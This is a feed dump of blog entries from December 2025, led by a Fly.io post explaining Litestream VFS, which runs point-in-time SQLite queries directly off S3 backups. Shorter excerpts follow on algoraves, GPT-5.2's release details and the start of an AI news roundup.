{
    "articles": [
        {
            "content": [
                "<div class=\"lead\"><p><strong class=\"font-semibold text-navy-950\">I\u2019m Ben Johnson, and I work on Litestream at Fly.io. Litestream is the missing backup/restore system for SQLite. It\u2019s free, open-source software that should run anywhere, and</strong> <a href=\"https://fly.io/blog/litestream-v050-is-here/\" title=\"\"><strong class=\"font-semibold text-navy-950\">you can read more about it here</strong></a><strong class=\"font-semibold text-navy-950\">.</strong></p>\n</div>\n<p>Again with the sandwiches: assume we&rsquo;ve got a SQLite database of sandwich ratings, and we&rsquo;ve backed it up with <a href=\"https://fly.io/blog/litestream-v050-is-here/\" title=\"\">Litestream</a> to an S3 bucket.</p>\n\n<p>Now, on our local host, load up AWS credentials and an S3 path into our environment. Open SQLite and:</p>\n<div class=\"highlight-wrapper group relative \">\n  <button class=\"bubble-wrap z-20 absolute right-9 -mr-0.5 top-1.5 text-transparent group-hover:text-gray-400 group-hover:hocus:text-white focus:text-white bg-transparent group-hover:bg-gray-900 group-hover:hocus:bg-gray-700 focus:bg-gray-700 transition-colors grid place-items-center w-7 h-7 rounded-lg outline-none focus:outline-none\" type=\"button\">\n    <svg class=\"w-4 h-4 pointer-events-none\" fill=\"none\" stroke=\"currentColor\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"1.35\" viewBox=\"0 0 16 16\" xmlns=\"http://www.w3.org/2000/svg\"><g><path d=\"M9.912 8.037h2.732c1.277 0 2.315-.962 2.315-2.237a2.325 2.325 0 00-2.315-2.31H2.959m10.228 9.01H2.959M6.802 8H2.959\"><path d=\"M11.081 6.466L9.533 8.037l1.548 1.571\"></g></svg>\n    <span class=\"bubble-sm bubble-tl [--offset-l:-9px] tail text-navy-950\">\n      Wrap text\n    </span>\n  </button>\n  <button class=\"bubble-wrap z-20 absolute right-1.5 top-1.5 text-transparent group-hover:text-gray-400 group-hover:hocus:text-white focus:text-white bg-transparent group-hover:bg-gray-900 group-hover:hocus:bg-gray-700 focus:bg-gray-700 transition-colors grid place-items-center w-7 h-7 rounded-lg outline-none focus:outline-none\" type=\"button\">\n    <svg class=\"w-4 h-4 pointer-events-none\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"1.35\" viewBox=\"0 0 16 16\" xmlns=\"http://www.w3.org/2000/svg\"><g><path d=\"M10.576 7.239c0-.995-.82-1.815-1.815-1.815H3.315c-.995 0-1.815.82-1.815 1.815v5.446c0 .995.82 1.815 1.815 1.815h5.446c.995 0 1.815-.82 1.815-1.815V7.239z\"><path d=\"M10.576 10.577h2.109A1.825 1.825 0 0014.5 8.761V3.315A1.826 1.826 0 0012.685 1.5H7.239c-.996 0-1.815.819-1.816 1.815v1.617\"></g></svg>\n    <span class=\"bubble-sm bubble-tl [--offset-l:-6px] tail [--tail-x:calc(100%-30px)] text-navy-950\">\n      Copy to clipboard\n    </span>\n  </button>\n  <div class=\"highlight relative group\">\n    <pre class=\"highlight \"><code id=\"code-ghgwate7\">$ sqlite3\nSQLite version 3.50.4 2025-07-30 19:33:53\nsqlite&gt; .load litestream.so\nsqlite&gt; .open file:///my.db?vfs=litestream\n</code></pre>\n  </div>\n</div>\n<p>SQLite is now working from that remote database, defined by the Litestream backup files in the S3 path we configured. We can query it:</p>\n<div class=\"highlight-wrapper group relative \">\n  <button class=\"bubble-wrap z-20 absolute right-9 -mr-0.5 top-1.5 text-transparent group-hover:text-gray-400 group-hover:hocus:text-white focus:text-white bg-transparent group-hover:bg-gray-900 group-hover:hocus:bg-gray-700 focus:bg-gray-700 transition-colors grid place-items-center w-7 h-7 rounded-lg outline-none focus:outline-none\" type=\"button\">\n    <svg class=\"w-4 h-4 pointer-events-none\" fill=\"none\" stroke=\"currentColor\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"1.35\" viewBox=\"0 0 16 16\" xmlns=\"http://www.w3.org/2000/svg\"><g><path d=\"M9.912 8.037h2.732c1.277 0 2.315-.962 2.315-2.237a2.325 2.325 0 00-2.315-2.31H2.959m10.228 9.01H2.959M6.802 8H2.959\"><path d=\"M11.081 6.466L9.533 8.037l1.548 1.571\"></g></svg>\n    <span class=\"bubble-sm bubble-tl [--offset-l:-9px] tail text-navy-950\">\n      Wrap text\n    </span>\n  </button>\n  <button class=\"bubble-wrap z-20 absolute right-1.5 top-1.5 text-transparent group-hover:text-gray-400 group-hover:hocus:text-white focus:text-white bg-transparent group-hover:bg-gray-900 group-hover:hocus:bg-gray-700 focus:bg-gray-700 transition-colors grid place-items-center w-7 h-7 rounded-lg outline-none focus:outline-none\" type=\"button\">\n    <svg class=\"w-4 h-4 pointer-events-none\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"1.35\" viewBox=\"0 0 16 16\" xmlns=\"http://www.w3.org/2000/svg\"><g><path d=\"M10.576 7.239c0-.995-.82-1.815-1.815-1.815H3.315c-.995 0-1.815.82-1.815 1.815v5.446c0 .995.82 1.815 1.815 1.815h5.446c.995 0 1.815-.82 1.815-1.815V7.239z\"><path d=\"M10.576 10.577h2.109A1.825 1.825 0 0014.5 8.761V3.315A1.826 1.826 0 0012.685 1.5H7.239c-.996 0-1.815.819-1.816 1.815v1.617\"></g></svg>\n    <span class=\"bubble-sm bubble-tl [--offset-l:-6px] tail [--tail-x:calc(100%-30px)] text-navy-950\">\n      Copy to clipboard\n    </span>\n  </button>\n  <div class=\"highlight relative group\">\n    <pre class=\"highlight \"><code id=\"code-8exbr13e\">sqlite&gt; SELECT * FROM sandwich_ratings ORDER BY RANDOM() LIMIT 3 ; \n22|Veggie Delight|New York|4\n30|Meatball|Los Angeles|5\n168|Chicken Shawarma Wrap|Detroit|5\n</code></pre>\n  </div>\n</div>\n<p>This is Litestream VFS. It runs SQLite hot off an object storage URL. As long as you can load the shared library our tree builds for you, it&rsquo;ll work in your application the same way it does in the SQLite shell.</p>\n\n<p>Fun fact: we didn&rsquo;t have to download the whole database to run this query. More about this in a bit.</p>\n\n<p>Meanwhile, somewhere in prod, someone has it in for meatball subs and wants to knock them out of the bracket \u2013 oh, fuck:</p>\n<div class=\"highlight-wrapper group relative \">\n  <button class=\"bubble-wrap z-20 absolute right-9 -mr-0.5 top-1.5 text-transparent group-hover:text-gray-400 group-hover:hocus:text-white focus:text-white bg-transparent group-hover:bg-gray-900 group-hover:hocus:bg-gray-700 focus:bg-gray-700 transition-colors grid place-items-center w-7 h-7 rounded-lg outline-none focus:outline-none\" type=\"button\">\n    <svg class=\"w-4 h-4 pointer-events-none\" fill=\"none\" stroke=\"currentColor\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"1.35\" viewBox=\"0 0 16 16\" xmlns=\"http://www.w3.org/2000/svg\"><g><path d=\"M9.912 8.037h2.732c1.277 0 2.315-.962 2.315-2.237a2.325 2.325 0 00-2.315-2.31H2.959m10.228 9.01H2.959M6.802 8H2.959\"><path d=\"M11.081 6.466L9.533 8.037l1.548 1.571\"></g></svg>\n    <span class=\"bubble-sm bubble-tl [--offset-l:-9px] tail text-navy-950\">\n      Wrap text\n    </span>\n  </button>\n  <button class=\"bubble-wrap z-20 absolute right-1.5 top-1.5 text-transparent group-hover:text-gray-400 group-hover:hocus:text-white focus:text-white bg-transparent group-hover:bg-gray-900 group-hover:hocus:bg-gray-700 focus:bg-gray-700 transition-colors grid place-items-center w-7 h-7 rounded-lg outline-none focus:outline-none\" type=\"button\">\n    <svg class=\"w-4 h-4 pointer-events-none\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"1.35\" viewBox=\"0 0 16 16\" xmlns=\"http://www.w3.org/2000/svg\"><g><path d=\"M10.576 7.239c0-.995-.82-1.815-1.815-1.815H3.315c-.995 0-1.815.82-1.815 1.815v5.446c0 .995.82 1.815 1.815 1.815h5.446c.995 0 1.815-.82 1.815-1.815V7.239z\"><path d=\"M10.576 10.577h2.109A1.825 1.825 0 0014.5 8.761V3.315A1.826 1.826 0 0012.685 1.5H7.239c-.996 0-1.815.819-1.816 1.815v1.617\"></g></svg>\n    <span class=\"bubble-sm bubble-tl [--offset-l:-6px] tail [--tail-x:calc(100%-30px)] text-navy-950\">\n      Copy to clipboard\n    </span>\n  </button>\n  <div class=\"highlight relative group\">\n    <pre class=\"highlight \"><code id=\"code-gmf6f3i3\">sqlite&gt; UPDATE sandwich_ratings SET stars = 1 ;\n</code></pre>\n  </div>\n</div>\n<p>They forgot the <code>WHERE</code> clause!</p>\n<div class=\"highlight-wrapper group relative \">\n  <button class=\"bubble-wrap z-20 absolute right-9 -mr-0.5 top-1.5 text-transparent group-hover:text-gray-400 group-hover:hocus:text-white focus:text-white bg-transparent group-hover:bg-gray-900 group-hover:hocus:bg-gray-700 focus:bg-gray-700 transition-colors grid place-items-center w-7 h-7 rounded-lg outline-none focus:outline-none\" type=\"button\">\n    <svg class=\"w-4 h-4 pointer-events-none\" fill=\"none\" stroke=\"currentColor\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"1.35\" viewBox=\"0 0 16 16\" xmlns=\"http://www.w3.org/2000/svg\"><g><path d=\"M9.912 8.037h2.732c1.277 0 2.315-.962 2.315-2.237a2.325 2.325 0 00-2.315-2.31H2.959m10.228 9.01H2.959M6.802 8H2.959\"><path d=\"M11.081 6.466L9.533 8.037l1.548 1.571\"></g></svg>\n    <span class=\"bubble-sm bubble-tl [--offset-l:-9px] tail text-navy-950\">\n      Wrap text\n    </span>\n  </button>\n  <button class=\"bubble-wrap z-20 absolute right-1.5 top-1.5 text-transparent group-hover:text-gray-400 group-hover:hocus:text-white focus:text-white bg-transparent group-hover:bg-gray-900 group-hover:hocus:bg-gray-700 focus:bg-gray-700 transition-colors grid place-items-center w-7 h-7 rounded-lg outline-none focus:outline-none\" type=\"button\">\n    <svg class=\"w-4 h-4 pointer-events-none\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"1.35\" viewBox=\"0 0 16 16\" xmlns=\"http://www.w3.org/2000/svg\"><g><path d=\"M10.576 7.239c0-.995-.82-1.815-1.815-1.815H3.315c-.995 0-1.815.82-1.815 1.815v5.446c0 .995.82 1.815 1.815 1.815h5.446c.995 0 1.815-.82 1.815-1.815V7.239z\"><path d=\"M10.576 10.577h2.109A1.825 1.825 0 0014.5 8.761V3.315A1.826 1.826 0 0012.685 1.5H7.239c-.996 0-1.815.819-1.816 1.815v1.617\"></g></svg>\n    <span class=\"bubble-sm bubble-tl [--offset-l:-6px] tail [--tail-x:calc(100%-30px)] text-navy-950\">\n      Copy to clipboard\n    </span>\n  </button>\n  <div class=\"highlight relative group\">\n    <pre class=\"highlight \"><code id=\"code-r3z3j63d\">sqlite&gt; SELECT * FROM sandwich_ratings ORDER BY RANDOM() LIMIT 3 ; \n97|French Dip|Los Angeles|1\n140|B\u00e1nh M\u00ec|San Francisco|1\n62|Italian Beef|Chicago|1\n</code></pre>\n  </div>\n</div>\n<p>Italian Beefs and B\u00e1nh M\u00ecs, all at 1 star. Disaster!</p>\n\n<p>But wait, back on our dev machine:</p>\n<div class=\"highlight-wrapper group relative \">\n  <button class=\"bubble-wrap z-20 absolute right-9 -mr-0.5 top-1.5 text-transparent group-hover:text-gray-400 group-hover:hocus:text-white focus:text-white bg-transparent group-hover:bg-gray-900 group-hover:hocus:bg-gray-700 focus:bg-gray-700 transition-colors grid place-items-center w-7 h-7 rounded-lg outline-none focus:outline-none\" type=\"button\">\n    <svg class=\"w-4 h-4 pointer-events-none\" fill=\"none\" stroke=\"currentColor\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"1.35\" viewBox=\"0 0 16 16\" xmlns=\"http://www.w3.org/2000/svg\"><g><path d=\"M9.912 8.037h2.732c1.277 0 2.315-.962 2.315-2.237a2.325 2.325 0 00-2.315-2.31H2.959m10.228 9.01H2.959M6.802 8H2.959\"><path d=\"M11.081 6.466L9.533 8.037l1.548 1.571\"></g></svg>\n    <span class=\"bubble-sm bubble-tl [--offset-l:-9px] tail text-navy-950\">\n      Wrap text\n    </span>\n  </button>\n  <button class=\"bubble-wrap z-20 absolute right-1.5 top-1.5 text-transparent group-hover:text-gray-400 group-hover:hocus:text-white focus:text-white bg-transparent group-hover:bg-gray-900 group-hover:hocus:bg-gray-700 focus:bg-gray-700 transition-colors grid place-items-center w-7 h-7 rounded-lg outline-none focus:outline-none\" type=\"button\">\n    <svg class=\"w-4 h-4 pointer-events-none\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"1.35\" viewBox=\"0 0 16 16\" xmlns=\"http://www.w3.org/2000/svg\"><g><path d=\"M10.576 7.239c0-.995-.82-1.815-1.815-1.815H3.315c-.995 0-1.815.82-1.815 1.815v5.446c0 .995.82 1.815 1.815 1.815h5.446c.995 0 1.815-.82 1.815-1.815V7.239z\"><path d=\"M10.576 10.577h2.109A1.825 1.825 0 0014.5 8.761V3.315A1.826 1.826 0 0012.685 1.5H7.239c-.996 0-1.815.819-1.816 1.815v1.617\"></g></svg>\n    <span class=\"bubble-sm bubble-tl [--offset-l:-6px] tail [--tail-x:calc(100%-30px)] text-navy-950\">\n      Copy to clipboard\n    </span>\n  </button>\n  <div class=\"highlight relative group\">\n    <pre class=\"highlight \"><code id=\"code-ezu1pbmw\">sqlite&gt; PRAGMA litestream_time = '5 minutes ago'; \nsqlite&gt; select * from sandwich_ratings ORDER BY RANDOM() LIMIT 3 ; \n30|Meatball|Los Angeles|5\n33|Ham &amp; Swiss|Los Angeles|2\n163|Chicken Shawarma Wrap|Detroit|5\n</code></pre>\n  </div>\n</div>\n<p>We&rsquo;re now querying that database from a specific point in time in our backups. We can do arbitrary relative timestamps, or absolute ones, like <code>2000-01-01T00:00:00Z</code>.</p>\n\n<p>What we&rsquo;re doing here is instantaneous point-in-time recovery (PITR), expressed simply in SQL and SQLite pragmas.</p>\n\n<p>Ever wanted to do a quick query against a prod dataset, but didn&rsquo;t want to shell into a prod server and fumble with the <code>sqlite3</code> terminal command like a hacker in an 80s movie? Or needed to do a quick sanity check against yesterday&rsquo;s data, but without doing a full database restore? Litestream VFS makes that easy. I&rsquo;m so psyched about how it turned out.</p>\n<h2 class=\"group flex items-start whitespace-pre-wrap relative mt-14 sm:mt-16 mb-4 text-navy-950 font-heading\" id=\"how-it-works\"><a class=\"inline-block align-text-top relative top-[.15em] w-6 h-6 -ml-6 after:hash opacity-0 group-hover:opacity-100 transition-all\" href=\"https://fly.io/blog/feed.xml#how-it-works\"></a><span class=\"plain-code\">How It Works</span></h2>\n<p><a href=\"https://fly.io/blog/litestream-v050-is-here/\" title=\"\">Litestream v0.5</a> integrates <a href=\"https://github.com/superfly/ltx\" title=\"\">LTX</a>, our SQLite data-shipping file format. Where earlier Litestream blindly shipped whole raw SQLite pages to and from object storage, LTX ships ordered sets of pages. We built LTX for <a href=\"https://fly.io/docs/litefs/\" title=\"\">LiteFS</a>, which uses a FUSE filesystem to do transaction-aware replication for unmodified applications, but we&rsquo;ve spent this year figuring out ways to use LTX in Litestream, without all that FUSE drama.</p>\n\n<p>The big thing LTX gives us is &ldquo;compaction&rdquo;. When we restore a database from object storage, we want the most recent versions of each changed database page. What we don&rsquo;t want are all the intermediate versions of those pages that occurred prior to the most recent change.</p>\n\n<p>Imagine, at the time we&rsquo;re restoring, we&rsquo;re going to need pages 1, 2, 3, 4, and 5. Depending on the order in which pages were written, the backup data set might look something like <code>1 2 3 5 3 5 4 5 5</code>. What we want is the <em>rightmost</em>  5, 4, 3, 2, and 1, without wasting time on the four &ldquo;extra&rdquo; page 5&rsquo;s and the one &ldquo;extra&rdquo; page 3. Those &ldquo;extra&rdquo; pages are super common in SQLite data sets; for instance, every busy table with an autoincrementing primary key will have them.</p>\n\n<p>LTX lets us skip the redundant pages, and the algorithm is trivial: reading backwards from the end of the sequence, skipping any page you already read. This drastically accelerates restores.</p>\n\n<p>But LTX compaction isn&rsquo;t limited to whole databases. We can also LTX-compact sets of LTX files. That&rsquo;s the key to how PITR restores with Litestream now work.</p>\n\n<p>In the diagram below, we&rsquo;re taking daily full snapshots. Below those snapshots are &ldquo;levels&rdquo; of changesets: groups of database pages from smaller and smaller windows of time. By default, Litestream uses time intervals of 1 hour at the highest level, down to 30 seconds at level 1. L0 is a special level where files are uploaded every second, but are only retained until being compacted to L1.</p>\n\n<p><img src=\"https://fly.io/blog/litestream-vfs/assets/litestream-restore.png\" /></p>\n\n<p>Now, let&rsquo;s do a PITR restore. Start from the most proximal snapshot. Then determine the minimal set of LTX files from each level to reach the time you are restoring to.</p>\n\n<p><img src=\"https://fly.io/blog/litestream-vfs/assets/litestream-restore-path.png\" /></p>\n\n<p>We have another trick up our sleeve.</p>\n\n<p>LTX trailers include a small index tracking the offset of each page in the file. By fetching <em>only</em> these index trailers from the LTX files we&rsquo;re working with (each occupies about 1% of its LTX file), we can build a lookup table of every page in the database. Since modern object storage providers all let us fetch slices of files, we can perform individual page reads against S3 directly.</p>\n\n<p><img alt=\"Anatomy of an LTX file\" src=\"https://fly.io/blog/litestream-vfs/assets/litestream-ltx.png\" /></p>\n<h2 class=\"group flex items-start whitespace-pre-wrap relative mt-14 sm:mt-16 mb-4 text-navy-950 font-heading\" id=\"how-its-implemented\"><a class=\"inline-block align-text-top relative top-[.15em] w-6 h-6 -ml-6 after:hash opacity-0 group-hover:opacity-100 transition-all\" href=\"https://fly.io/blog/feed.xml#how-its-implemented\"></a><span class=\"plain-code\">How It&rsquo;s Implemented</span></h2>\n<p>SQLite has a plugin interface for things like this: <a href=\"https://sqlite.org/vfs.html\" title=\"\">the &ldquo;VFS&rdquo; interface.</a> VFS plugins abstract away the bottom-most layer of SQLite, the interface to the OS. If you&rsquo;re using SQLite now, you&rsquo;re already using some VFS module, one SQLite happens to ship with.</p>\n\n<p>For Litestream users, there&rsquo;s a catch. From the jump, we&rsquo;ve designed Litestream to run alongside unmodified SQLite applications. Part of what makes Litestream so popular is that your apps don&rsquo;t even need to know it exists. It&rsquo;s &ldquo;just&rdquo; a Unix program.</p>\n\n<p>That Litestream Unix program still does PITR restores, without any magic. But to do fast PITR-style queries straight off S3, we need more. To make those queries work, you have to load and register Litestream&rsquo;s VFS module.</p>\n\n<p>But that&rsquo;s all that changes.</p>\n\n<p>In particular: Litestream VFS doesn&rsquo;t replace the SQLite library you&rsquo;re already using. It&rsquo;s not a new &ldquo;version&rdquo; of SQLite. It&rsquo;s just a plugin for the SQLite you&rsquo;re already using.</p>\n\n<p>Still, we know that&rsquo;s not going to work for everybody, and even though we&rsquo;re really psyched about these PITR features, we&rsquo;re not taking our eyes off the ball on the rest of Litestream. You don&rsquo;t have to use our VFS library to use Litestream, or to get the other benefits of the new LTX code.</p>\n\n<p>The way a VFS library works, we&rsquo;re given just a couple structures, each with a bunch of methods defined on them. We override only the few methods we care about. Litestream VFS handles only the read side of SQLite. Litestream itself, running as a normal Unix program, still handles the &ldquo;write&rdquo; side. So our VFS subclasses just enough to find LTX backups and issue queries.</p>\n\n<p>With our VFS loaded, whenever SQLite needs to read a page into memory, it issues a <code>Read()</code> call through our library. The read call includes the byte offset at which SQLite expected to find the page. But with Litestream VFS, that byte offset is an illusion.</p>\n\n<p>Instead, we use our knowledge of the page size along with the requested page number to do a lookup on the page index we&rsquo;ve built. From it, we get the remote filename, the &ldquo;real&rdquo; byte offset into that file, and the size of the page. That&rsquo;s enough for us to use the <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/range-get-olap.html\" title=\"\">S3 API&rsquo;s <code>Range</code> header handling</a> to download exactly the block we want.</p>\n\n<p>To save lots of S3 calls, Litestream VFS implements an LRU cache. Most databases have a small set of &ldquo;hot&rdquo; pages \u2014  inner branch pages or the leftmost leaf pages for tables with an auto-incrementing ID field. So only a small percentage of the database is updated and queried regularly.</p>\n<div class=\"callout\"><p><strong class=\"font-semibold text-navy-950\">We\u2019ve got one last trick up our sleeve.</strong></p>\n\n<p>Quickly building an index and restore plan for the current state of a database is cool. But we can do one better.</p>\n\n<p>Because Litestream backs up (into the L0 layer) once per second, the VFS code can simply poll the S3 path, and then incrementally update its index. <strong class=\"font-semibold text-navy-950\">The result is a near-realtime replica.</strong> Better still, you don\u2019t need to stream the whole database back to your machine before you use it.</p>\n</div><h2 class=\"group flex items-start whitespace-pre-wrap relative mt-14 sm:mt-16 mb-4 text-navy-950 font-heading\" id=\"eat-your-heart-out-marty-mcfly\"><a class=\"inline-block align-text-top relative top-[.15em] w-6 h-6 -ml-6 after:hash opacity-0 group-hover:opacity-100 transition-all\" href=\"https://fly.io/blog/feed.xml#eat-your-heart-out-marty-mcfly\"></a><span class=\"plain-code\">Eat Your Heart Out, Marty McFly</span></h2>\n<p>Litestream holds backup files for every state your database has been in, with single-second resolution, for as long as you want it to. Forgot the <code>WHERE</code> clause on a <code>DELETE</code> statement? Updating your database state to where it was an hour (or day, or week) ago is just a matter of adjusting the LTX indices Litestream manages.</p>\n\n<p>All this smoke-and-mirrors of querying databases without fully fetching them has another benefit: it starts up really fast! We&rsquo;re living an age of increasingly ephemeral servers, what with the AIs and the agents and the clouds and the hoyvin-glavins. Wherever you find yourself, if your database is backed up to object storage with Litestream, you&rsquo;re always in a place where you can quickly issue a query.</p>\n\n<p>As always, one of the big things we think we&rsquo;re doing right with Litestream is: we&rsquo;re finding ways to get as much whiz-bang value as we can (instant PITR reading live off object storage: pretty nifty!) while keeping the underlying mechanism simple enough that you can fit your head around it.</p>\n\n<p>Litestream is solid for serious production use (we rely on it for important chunks of our own Fly.io APIs). But you could write Litestream yourself, just from the basic ideas in these blog posts. We think that&rsquo;s a point in its favor. We land there because the heavy lifting in Litestream is being done by SQLite itself, which is how it should be.</p>"
            ],
            "link": "https://fly.io/blog/litestream-vfs/",
            "publishedAt": "2025-12-11",
            "source": "Fly.io Blog",
            "summary": "<div class=\"lead\"><p><strong class=\"font-semibold text-navy-950\">I\u2019m Ben Johnson, and I work on Litestream at Fly.io. Litestream is the missing backup/restore system for SQLite. It\u2019s free, open-source software that should run anywhere, and</strong> <a href=\"https://fly.io/blog/litestream-v050-is-here/\" title=\"\"><strong class=\"font-semibold text-navy-950\">you can read more about it here</strong></a><strong class=\"font-semibold text-navy-950\">.</strong></p> </div> <p>Again with the sandwiches: assume we&rsquo;ve got a SQLite database of sandwich ratings, and we&rsquo;ve backed it up with <a href=\"https://fly.io/blog/litestream-v050-is-here/\" title=\"\">Litestream</a> to an S3 bucket.</p> <p>Now, on our local host, load up AWS credentials and an S3 path into our environment. Open SQLite and:</p> <div class=\"highlight-wrapper group relative \"> <button class=\"bubble-wrap z-20 absolute right-9 -mr-0.5 top-1.5 text-transparent group-hover:text-gray-400 group-hover:hocus:text-white focus:text-white bg-transparent group-hover:bg-gray-900 group-hover:hocus:bg-gray-700 focus:bg-gray-700 transition-colors grid place-items-center w-7 h-7 rounded-lg outline-none focus:outline-none\" type=\"button\"> <svg class=\"w-4 h-4 pointer-events-none\" fill=\"none\" stroke=\"currentColor\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"1.35\" viewBox=\"0 0 16 16\" xmlns=\"http://www.w3.org/2000/svg\"><g><path d=\"M9.912 8.037h2.732c1.277 0 2.315-.962 2.315-2.237a2.325 2.325 0 00-2.315-2.31H2.959m10.228 9.01H2.959M6.802 8H2.959\"><path d=\"M11.081 6.466L9.533 8.037l1.548 1.571\"></g></svg> <span class=\"bubble-sm bubble-tl [--offset-l:-9px] tail text-navy-950\"> Wrap text </span> </button> <button class=\"bubble-wrap z-20 absolute right-1.5 top-1.5 text-transparent group-hover:text-gray-400 group-hover:hocus:text-white focus:text-white bg-transparent group-hover:bg-gray-900 group-hover:hocus:bg-gray-700 focus:bg-gray-700 transition-colors grid place-items-center w-7 h-7 rounded-lg outline-none focus:outline-none\" type=\"button\"> <svg class=\"w-4 h-4 pointer-events-none\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"1.35\" viewBox=\"0 0 16 16\" xmlns=\"http://www.w3.org/2000/svg\"><g><path d=\"M10.576 7.239c0-.995-.82-1.815-1.815-1.815H3.315c-.995 0-1.815.82-1.815 1.815v5.446c0 .995.82 1.815 1.815 1.815h5.446c.995 0",
            "title": "Litestream VFS"
        },
        {
            "content": [],
            "link": "https://interconnected.org/home/2025/12/11/live",
            "publishedAt": "2025-12-11",
            "source": "Matt Webb",
            "summary": "<div> <p>My new fave thing to go to is live coding gigs, a.k.a. <em>algoraves.</em></p> <p>There are special browser-based programming languages like <a href=\"https://strudel.cc\">strudel</a> where you type code to define the beats and the sound, like mod synth in code, and it plays in a loop even while you\u2019re coding. (The playhead moves along as a little white box.)</p> <p>As you write more code and edit the code, you make the music.</p> <p>So people do gigs like this: their laptop is hooked up to (a) speakers and (b) a projector. You see the code on the big screen in real-time as it is written and hear it too.</p> <p><a href=\"https://www.instagram.com/genmon/p/DRxw7t7DY24/\">Here\u2019s what it looks like</a> <em>(Instagram).</em></p> <p>That pic is from a crypt under a church in Camberwell at an event called <a href=\"https://luma.com/symkozub?tk=RJRA64\">Low Stakes | High Spirits</a>.</p> <p>(There are <a href=\"https://luma.com/londonlivecoding\">more London Live Coding events</a>. I\u2019ve been to an AlgoRhythm night too and it was ace.)</p> <hr /> <p>It helps that these beeps and boops are the kind of music I listen to anyway.</p> <p>But there is something special about the performer performing right there with the audience and vibing off them.</p> <p>Like all art, there\u2019s some stuff you prefer and some",
            "title": "My new fave thing to go to is algoraves"
        },
        {
            "content": [],
            "link": "https://www.nytimes.com/2025/12/11/style/tiny-modern-love-stories-he-invited-me-in-for-a-glass-of-wine.html",
            "publishedAt": "2025-12-11",
            "source": "Modern Love - NYT",
            "summary": "Modern Love in miniature, featuring reader-submitted stories of no more than 100 words.",
            "title": "Tiny Love Stories: \u2018He Invited Me In for a Glass of Wine\u2019"
        },
        {
            "content": [],
            "link": "https://www.robinsloan.com/lab/compute-market/",
            "publishedAt": "2025-12-11",
            "source": "Robin Sloan",
            "summary": "<p>Maybe it becomes Chicago-shaped. <a href=\"https://www.robinsloan.com/lab/compute-market/\">Read here.</a></p>",
            "title": "The market for compute"
        },
        {
            "content": [],
            "link": "https://simonwillison.net/2025/Dec/11/gpt-52/#atom-entries",
            "publishedAt": "2025-12-11",
            "source": "Simon Willison",
            "summary": "<p>OpenAI reportedly <a href=\"https://www.wsj.com/tech/ai/openais-altman-declares-code-red-to-improve-chatgpt-as-google-threatens-ai-lead-7faf5ea6\">declared a \"code red\"</a> on the 1st of December in response to increasingly credible competition from the likes of Google's Gemini 3. It's less than two weeks later and they just <a href=\"https://openai.com/index/introducing-gpt-5-2/\">announced GPT-5.2</a>, calling it \"the most capable model series yet for professional knowledge work\".</p> <h4 id=\"key-characteristics-of-gpt-5-2\">Key characteristics of GPT-5.2</h4> <p>The new model comes in two variants: GPT-5.2 and GPT-5.2 Pro. There's no Mini variant yet.</p> <p>GPT-5.2 is available via their UI in both \"instant\" and \"thinking\" modes, presumably still corresponding to the API concept of different reasoning effort levels.</p> <p>The knowledge cut-off date for both variants is now <strong>August 31st 2025</strong>. This is significant - GPT 5.1 and 5 were both Sep 30, 2024 and GPT-5 mini was May 31, 2024.</p> <p>Both of the 5.2 models have a 400,000 token context window and 128,000 max output tokens - no different from 5.1 or 5.</p> <p>Pricing wise 5.2 is a rare <em>increase</em> - it's 1.4x the cost of GPT 5.1, at $1.75/million input and $14/million output. GPT-5.2 Pro is $21.00/million input and a hefty $168.00/million output, putting it <a href=\"https://www.llm-prices.com/#sel=gpt-4.5%2Co1-pro%2Cgpt-5.2-pro\">up there</a> with their previous most expensive models o1 Pro and GPT-4.5.</p> <p>So far the main benchmark",
            "title": "GPT-5.2"
        },
        {
            "content": [
                "<p>It was touch and go, I\u2019m worried GPT-5.2 is going to drop any minute now, but <a href=\"https://thezvi.substack.com/p/deepseek-v32-is-okay-and-cheap-but?r=67wny\"><strong>DeepSeek v3.2 was covered on Friday</strong></a> and after that we managed to get through the week without a major model release. Well, okay, also Gemini 3 DeepThink, but we all pretty much know what that offers us.</p>\n<p>We did have a major chip release, in that the Trump administration unwisely <a href=\"https://thezvi.substack.com/p/selling-h200s-to-china-is-unwise?r=67wny\"><strong>chose to sell H200 chips directly to China</strong></a>. This would, if allowed at scale, allow China to make up a substantial portion of its compute deficit, and greatly empower its AI labs, models and applications at our expense, in addition to helping it catch up in the race to AGI and putting us all at greater risk there. We should do what we can to stop this from happening, and also to stop similar moves from happening again.</p>\n<div>\n\n\n<span id=\"more-24947\"></span>\n\n\n</div>\n<p>I spent the weekend <a href=\"https://thezvi.substack.com/p/little-echo?r=67wny\"><strong>visiting Berkeley for the Secular Solstice</strong></a>. I highly encourage everyone to<a href=\"https://www.youtube.com/watch?v=pfotEo7pVqc\"> <strong>watch that event on YouTube</strong></a> if you could not attend, and consider <a href=\"https://rationalistmegameetup.com/\"><strong>attending the New York Secular Solstice on the 20th</strong></a>. I will be there, and also at the associated mega-meetup, please do say hello.</p>\n<p>If all goes well this break can continue, and the rest of December can be its traditional month of relaxation, family and many of the year\u2019s best movies.</p>\n<p>On a non-AI note, I\u2019m working on a piece to enter into the discourse about poverty lines and vibecessions and how hard life is actually getting in America, and hope to have that done soon, but there\u2019s a lot to get through.</p>\n\n\n<h4 class=\"wp-block-heading\">Table of Contents</h4>\n\n\n<p>(Reminder: Bold means be sure to read this, Italics means you can safely skip this.)</p>\n<ol>\n<li><a href=\"https://thezvi.substack.com/i/180812454/language-models-offer-mundane-utility\">Language Models Offer Mundane Utility.</a> Simulators versus the character.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/chatgpt-needs-more-mundane-utility\"><strong>ChatGPT Needs More Mundane Utility</strong>.</a> OpenAI goes for engagementmaxxing.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/language-models-don-t-offer-mundane-utility\">Language Models Don\u2019t Offer Mundane 